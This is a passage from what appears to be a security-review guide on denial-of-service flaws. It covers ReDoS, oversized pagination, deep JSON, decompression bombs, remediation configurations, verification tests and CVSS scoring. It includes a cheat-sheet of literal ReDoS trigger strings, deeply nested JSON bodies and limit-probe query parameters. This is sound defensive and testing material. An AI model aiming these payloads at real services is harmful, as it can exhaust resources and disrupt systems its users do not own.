1. Request the same list endpoint twice: once `GET /api/items?limit=20&page=1`, once `GET /api/items?limit=99999999&page=1`.
2. Compare row counts and latencies. Expected observables: second response returning hundreds of thousands of rows serialized over many seconds (missing clamp), versus identical small page or `400` (clamped). Also try `limit=-1` once: negative values frequently bypass naive clamps entirely.

### Procedure F: quadratic-collection endpoint (3 requests)

1. Find an endpoint accepting item arrays (bulk create/tag/search). Build payloads of 100, 1000, 3000 items locally.
2. Send each once, recording latency. Expected observables: latency growing ~100x from first to last (O(n^2)) versus ~30x (linear) — read the loop to confirm which; combine with the static trace for the finding. Stop at 3000 items regardless of results.

### Payload cheat-sheet

ReDoS triggers by vulnerable shape (start small; escalate length only if nothing hangs):

| Shape | Trigger (notation) | Literal trigger |
| --- | --- | --- |
| `(a+)+$` | `'a'*30 + '!'` | `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!` |
| `(a|a)*$`, `(a|aa)+$` | `'a'*28 + '!'` | 28 a's followed by `!` |
| `(.*a){20}` | `'x'*25` | 25 x's (no trailing a) |
| `^(\d+)*$` | `'1'*30 + 'X'` | `111111111111111111111111111111X` |
| `(a|ab)+$` | `'a'*26 + 'c'` | 26 a's followed by `c` |
| CSV shape `^(\w+,)+\w+$` | `'a,'*30 + '!'` | `a,` repeated 30 times then `!` |

Deep-JSON body shape (depth attack):

```json
{"data":[[[[[[[[[[[[[[[[[[[[{"deep":1}]]]]]]]]]]]]]]]]]]]]]}
```

Generator for arbitrary depth: `'{"a":'*n + '1' + '}'*n` (objects) or `'['*n + ']'*n` (arrays).

Limit-probe query parameters: `?limit=99999999&page=1`, `?page_size=2147483647`, `?per_page=all`, `?count=-1&limit=-1`, `?offset=99999999&limit=100000`.

## Remediation

### Input-size caps (apply defense in depth: app layer AND proxy)

| Stack | Exact configuration |
| --- | --- |
| Node/Express | `app.use(express.json({ limit: "100kb" }))`; same `limit` on `express.urlencoded`; multer: `multer({ limits: { fileSize: 10485760, files: 5 } })` |
| Django | `DATA_UPLOAD_MAX_MEMORY_SIZE = 2621440`, `FILE_UPLOAD_MAX_MEMORY_SIZE = 2621440`, keep `DATA_UPLOAD_MAX_NUMBER_FIELDS = 1000` (raise deliberately, never remove) |
| Flask | `app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024` |
| FastAPI/Starlette | No built-in cap — add ASGI middleware that rejects when `Content-Length` exceeds your bound and reads the body through a counting wrapper that aborts mid-stream |
| Spring Boot | `spring.servlet.multipart.max-file-size=10MB`, `spring.servlet.multipart.max-request-size=12MB`; WebFlux: `spring.codec.max-in-memory-size=256KB` |
| ASP.NET Core | `builder.WebHost.ConfigureKestrel(o => o.Limits.MaxRequestBodySize = 10_485_760);` plus `[RequestSizeLimit(10_485_760)]` on heavy endpoints; IIS: raise/lower `<requestLimits maxAllowedContentLength>` consistently |

```js
// FIXED: Express explicit caps at boot
app.use(express.json({ limit: "100kb" }));
app.use(express.urlencoded({ extended: true, limit: "100kb" }));
```

```go
// FIXED: Go has NO default body cap - wrap every body-consuming route
r.Body = http.MaxBytesReader(w, r.Body, 10<<20) // 10 MiB
```

CONFIG cross-ref (reverse proxy outer boundary — nginx):

```nginx
server {
    client_max_body_size 1m;
    client_body_timeout 12s;
    proxy_read_timeout 30s;
}
```

### Regex hardening decision tree

Apply IN ORDER until the candidate is bounded: (1) reject inputs above a tight length BEFORE matching; (2) simplify the pattern to a linear shape; (3) enable the engine's timeout/possessive features; (4) migrate engine (npm `re2`, Python `google-re2`, Java RE2/J) where the platform allows. Go/Rust stdlib need no migration — only ensure patterns were not ported expecting lookarounds/backrefs.

```java
// VULNERABLE
Pattern USER = Pattern.compile("^([a-zA-Z0-9]+)*$");           // redundant outer star
// FIXED
Pattern USER = Pattern.compile("^[a-zA-Z0-9]+$");              // linear shape; atomic group "(?>...)" acceptable alternative
```

```csharp
// VULNERABLE
var rx = new Regex(@"^(\d+)*$");
// FIXED
var rx = new Regex(@"^\d+$", RegexOptions.None, TimeSpan.FromMilliseconds(250)); // ALWAYS pass matchTimeout
```

```python
# VULNERABLE
re.fullmatch(r"(a|aa)+", user_input)
# FIXED (PyPI regex module supports engine-level timeout)
import regex
regex.fullmatch(r"(a|aa)+", user_input, timeout=0.25)  # raises TimeoutError instead of hanging
```

```js
// VULNERABLE
const ok = /^(a+)+$/.test(input);
// FIXED
if (typeof input !== "string" || input.length > 256) return false; // length gate FIRST
const RE2 = require("re2");
const ok = new RE2("^(a+)+$").test(input);                          // linear-time engine
```

Possessive-quantifier support recap (use `a++`, `(?>...)` where listed): Java, .NET, PCRE/PHP 7.3+, Python 3.11+ `re`, Ruby Onigmo. NOT available in JavaScript — use npm `re2` or restructure there.

### Bounded parsing and streaming (never load-whole-file)

| Language | Stream JSON | Stream CSV | Safe XML | Guard images/archives |
| --- | --- | --- | --- | --- |
| Node | `stream-json`, NDJSON lines | `csv-parse` stream mode | `saxes` with DOCTYPE disabled | `sharp` (streams, pixel limits); multer byte caps |
| Python | `ijson.items(f, "item")` | `csv.reader(open(...))` iterates lazily | `defusedxml` (forbids DTD/entities) | Pillow `Image.MAX_IMAGE_PIXELS` (~89 Mpx default) trips DecompressionBomb errors; check before `extractall` |
| Java | Jackson streaming `JsonParser` | univocity-parsers row iterator | `XMLInputFactory` with `SUPPORT_DTD=false` | Apache POI `ZipSecureFile` inflate-ratio guard defaults; SXSSF streaming writer |
| C# | `System.Text.Json` `JsonDocument` with `JsonReaderOptions.MaxDepth` (default 64) | CsvHelper `csv.GetRecords()` lazy enumeration | `XmlReaderSettings { DtdProcessing = Prohibit, XmlResolver = null }` | check archive entry sizes before `ExtractToDirectory` |
| PHP | `stream_json`/line-delimited chunks | `fgetcsv()` loop | `XMLReader` + libxml entity loader disabled | `getimagesize()` before load; per-file ini caps |
| Ruby | `yajl`/NDJSON | `CSV.foreach` streams | `Nokogiri::XML::Reader` with nonet + noent omitted | MiniMagick `identify` first; ActiveStorage blob validations |
| Go | `json.Decoder.Token()` loop | `encoding/csv` Reader iterates | `xml.Decoder` (no entity expansion by default; Strict mode) | `image.DecodeConfig` reads dimensions WITHOUT full decode; wrap sources in `io.LimitReader` |

### Decompression-bomb guards (pseudocode; enforce ALL four)

```text
MAX_OUTPUT_BYTES = 100 MB      MAX_ENTRIES = 10,000      MAX_RATIO = 100:1      MAX_DEPTH = 1

entries = 0 ; total_out = 0
for each archive entry:
    entries += 1 ; abort if entries > MAX_ENTRIES
    declared = entry.uncompressed_size            # from header/central directory
    abort if declared > MAX_OUTPUT_BYTES
    abort if entry.compressed_size > 0 and declared / entry.compressed_size > MAX_RATIO
    stream-copy entry while COUNTING REAL BYTES   # headers can lie; enforce during copy too
    total_out += counted ; abort if total_out > MAX_OUTPUT_BYTES
    if entry looks like a nested archive: abort unless MAX_DEPTH allows, recurse within REMAINING budget only
```

Tar-specific entry-name traversal, link handling, and path-count bombs: cross-reference file-handling.md.

### Pagination enforcement

```js
// FIXED: default AND ceiling, integer-parsed
const limit = Math.min(Number.parseInt(req.query.limit ?? "20", 10) || 20, 100);
const offset = Math.max(0, Number.parseInt(req.query.offset ?? "0", 10) || 0);
```

Python/Ruby equivalents: `limit = min(int(request.GET.get("limit", 20)), 100)`; `per_page = [params.fetch(:per_page, 20).to_i, 100].min`. Prefer cursor/keyset pagination for large tables; move exports to async jobs producing a downloadable artifact (next subsection) instead of serializing whole datasets inline.

### Query-amplification and N+1 fixes

Eager-load associations reached by list endpoints: Django `.prefetch_related(...)`/`.select_related(...)`, Rails `.includes(...)`, JPA `@EntityGraph` or `JOIN FETCH`, SQLAlchemy `selectinload(...)`. Batch per-item cache lookups (DataLoader pattern). For GraphQL, enforce depth limiting (`graphql-depth-limit`) plus cost/complexity analysis (`graphql-cost-analysis` or equivalent validation rules) and cap resolver list sizes — detailed guidance in api-security.md.

### Offload heavy work to async workers

```text
handler: validate input -> check quota -> enqueue(job_id, idempotency_key) -> respond 202 {job_id}
worker: bounded concurrency; per-tenant quota accounting; circuit breaker on third-party failures
client: poll GET /jobs/{id}
```

Stack-native queues: BullMQ (Node), Celery (Python), Sidekiq (Ruby), Hangfire (.NET), asynq (Go). Transcodes, bulk imports, report generation, SMS/email fanout all belong behind this boundary.

### Cache, log, and bill-bomb hygiene

Redis eviction policy (unbounded keys otherwise accumulate forever):

```conf
# redis.conf
maxmemory 512mb
maxmemory-policy allkeys-lru
```

Rules: every cache/session key derived from user input carries a TTL (`SET key val EX 3600`); session creation on unauthenticated routes is rate-limited (cross-ref authn-session.md and api-security.md); error handlers truncate payloads before logging (`log.error("bad req len=%d", len(body))` not `log.error("%s", body)`); log rotation configured (logrotate unit, Docker `--log-opt max-size=10m --log-opt max-file=3`). Paid-call endpoints additionally get: idempotency keys, per-user daily quotas enforced server-side, and spend alerts wired to the provider account.

## Verification & Validation

### GIVEN/WHEN/THEN acceptance checks

Body-size cap (positive AND negative):

```text
GIVEN express.json is configured with limit 100kb
WHEN a client posts a 200 KB JSON body            THEN response is 413 and nothing was buffered wholesale
WHEN a client posts a legitimate 90 KB payload     THEN the request succeeds normally (negative test - real users unaffected)
```

Regex hardening:

```text
GIVEN the vulnerable pattern was rewritten or given an engine timeout
WHEN the endpoint receives "a" x 30 + "!"         THEN it responds within 500 ms with a normal status code
WHEN the endpoint receives typical production input THEN validation results are IDENTICAL to pre-fix behavior (no functional regression)
```

Pagination clamp:

```text
GIVEN server-side clamp limit = min(param || 20, 100)
WHEN GET /items?limit=99999999                    THEN at most 100 rows return
WHEN GET /items?limit=-1                          THEN the default applies (no negative-bypass full scan)
WHEN GET /items (no params)                       THEN the default page size applies
```

Decompression guard:

```text
GIVEN ratio/output/entry-count guards wrap archive extraction
WHEN bomb.zip (~1 MB storing 1 GB of zeros) is uploaded ONCE THEN an immediate 400/413 returns and service memory stays flat
WHEN a legitimate photo archive (ratio well under threshold) is uploaded THEN import succeeds completely
```

XML entity expansion:

```text
GIVEN parser rejects DTD/DOCTYPE
WHEN the billion-laughs document arrives           THEN instant 400/403, latency unchanged
WHEN ordinary entity-free XML arrives              THEN it parses as before
```

Event-loop blocking:

```text
GIVEN pbkdf2Sync-style work was moved off the request path
WHEN 5 concurrent requests hit endpoints while a login/hash operation runs THEN p95 latency stays within baseline x 1.5
```

### Load-test-lite (bounded; this is verification, NOT attack traffic)

```js
// k6-style pseudocode - fixed small concurrency, short window, assertions externalized
import http from "k6/http";
import { check } from "k6";

export const options = { vus: 5, duration: "60s" }; // deliberately bounded

export default function () {
  const r = http.get(`${__ENV.TARGET}/api/items?limit=20`);
  check(r, { "is 200": (res) => res.status === 200 });
}
// After the run ASSERT:
//   error rate < 1%, p95 latency < agreed threshold,
//   zero 5xx spikes, pod/container age unchanged (no restarts), memory curve returns to baseline
```

### Manual post-fix checklist

1. Every body/multipart parser shows an explicit cap at the APPLICATION layer (proxy caps are bonus, never the sole control).
2. Every regex candidate from the inventory has either passed the offline doubling harness, been rewritten linear, gained an engine timeout, or migrated engines.
3. Exports/reports stream or run as jobs; no handler serializes `.all()` datasets inline.
4. Pagination defaults AND ceilings exist; negative values rejected.
5. No synchronous CPU-heavy APIs remain in request handlers (Node list from Patterns & Signatures).
6. Redis runs with `maxmemory` set, an eviction policy, and TTLs on user-derived keys.
7. Paid third-party calls sit behind quota + idempotency + queue.
8. Log rotation verified active; error paths truncate payloads.

### Post-fix greps (expected outcomes)

Cap presence (expect hits in config/bootstrap files):

```regex
(express\.json\(\{\s*limit|MaxBytesReader|MAX_CONTENT_LENGTH|DATA_UPLOAD_MAX_MEMORY_SIZE|max-file-size|max-request-size|client_max_body_size)
```

Regex bounds present (expect hits wherever regexes touch input):

```regex
(TimeSpan\.FromMilliseconds|new RE2\(|com\.google\.re2j|Regexp\.timeout|timeout=\d)
```

Must now return ZERO hits in request-path code:

```regex
(pbkdf2Sync|compareSync|execSync|inflateSync)
```

Vulnerable-shape grep re-run should surface ONLY patterns annotated as reviewed/safe-engine:

```regex
\([^()]{1,60}[+*][^()]{0,60}\)[+*{]
```

## Severity Assessment

All vectors below use availability-only impact because these flaws do not directly breach confidentiality or integrity. Compute with care and justify deviations.

| Finding class | Example CVSS v3.1 vector | Score | Notes |
| --- | --- | --- | --- |
| Unauthenticated SINGLE request hangs/crashes/OOMs a worker (ReDoS CWE-1333, zip bomb CWE-409) | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | 7.5 High | One request, persistent effect |
| Unauthenticated multi-request exhaustion, amplification factor high (>~100x output/input or work/request) | same vector | 7.5 High | Sustained but cheap for attacker |
| Multi-request needed with LOW amplification (<10x) or effective rate limiting in place | `.../C:N/I:N/A:L` variant where infra demonstrably absorbs load | 5.3 Medium | Rubric: Medium-High band depending on measured factor |
| Authenticated-only reachability (any of the above behind login) | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` | 6.5 Medium | Drop roughly one severity level from its unauth counterpart |

Rubric summary: unauthenticated single-request crash/OOM = High; multi-request required = Medium-High scaled by amplification factor; authenticated-only = lower tier; third-party bill-bomb = High on financial grounds even when technical availability impact is partial — CVSS cannot price money, so carry the spend-amplification math (cost per request x attacker budget) in the narrative rather than inflating the vector.

Always state the OBSERVED amplifier (bytes-in : bytes-out, elements : queries, input chars : match time) in the report; it is the strongest severity evidence you can produce.

## Common False Positives

1. **Shape-flagged patterns on RE2-family engines**: `(a+)+$` in Go stdlib `regexp` or Rust `regex` is linear-time; verify the ENGINE before reporting (CWE-1333 does not apply).
2. **Proxy cap credited as app cap**: nginx `client_max_body_size` protects only traffic THROUGH the proxy; direct-to-origin routes bypass it. Verify application-layer limits independently.
3. **Large `limit` accepted but harmless**: some ORMs/databases enforce their own internal maximum, or responses are keyset-paginated/streamed regardless. Confirm actual row serialization before flagging.
4. **Heavy synchronous work in dedicated workers**: CPU-bound code inside job-worker processes/pools is by design; only request-path blocking is a finding.
5. **Admin bulk endpoints**: authenticated, role-gated, quota-ed bulk operations with audit trails are accepted-risk territory unless quotas are absent — report the missing control, not the feature.
6. **Timing noise read as complexity**: cold caches, JIT warmup, and network jitter mimic slowdowns. Require the doubling-ratio signature (or clear loop analysis) from the OFFLINE harness, never a single slow request.
7. **Quadratic regex behind an existing length gate**: if `len(input) <= 256` is enforced BEFORE matching, worst case is bounded; verify gate ORDERING precedes the match call.
8. **DOCTYPE rejection already in place**: parsers hardened against XXE usually refuse DTDs outright, which also kills billion-laughs; dedupe against deserialization.md findings instead of double-reporting.

## References

CWE entries used in this module:

- CWE-400 Uncontrolled Resource Consumption — https://cwe.mitre.org/data/definitions/400.html
- CWE-405 Asymmetric Resource Consumption (Amplification) — https://cwe.mitre.org/data/definitions/405.html
- CWE-407 Inefficient Algorithmic Complexity — https://cwe.mitre.org/data/definitions/407.html
- CWE-409 Improper Handling of Highly Compressed Data (Data Amplification) — https://cwe.mitre.org/data/definitions/409.html
- CWE-674 Uncontrolled Recursion — https://cwe.mitre.org/data/definitions/674.html
- CWE-770 Allocation of Resources Without Limits or Throttling — https://cwe.mitre.org/data/definitions/770.html
- CWE-776 Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion') — https://cwe.mitre.org/data/definitions/776.html
- CWE-789 Memory Allocation with Excessive Size Value — https://cwe.mitre.org/data/definitions/789.html
- CWE-1333 Inefficient Regular Expression Complexity — https://cwe.mitre.org/data/definitions/1333.html

OWASP resources (stable project/community URLs):

- Regular expression Denial of Service (ReDoS), OWASP Community Attacks — https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
- XML External Entity Prevention Cheat Sheet (covers entity expansion / billion-laughs defenses) — https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- OWASP Application Security Verification Standard (resource-handling and configuration requirements) — https://owasp.org/www-project-application-security-verification-standard/
- OWASP Cheat Sheet Series index — https://cheatsheetseries.owasp.org/

Sibling modules in this skillset referenced above: api-security.md (rate limiting, GraphQL depth/cost budgets), deserialization.md (XML entities, XXE hardening), file-handling.md (tar entry bombs, path traversal), authn-session.md (session-creation spam).
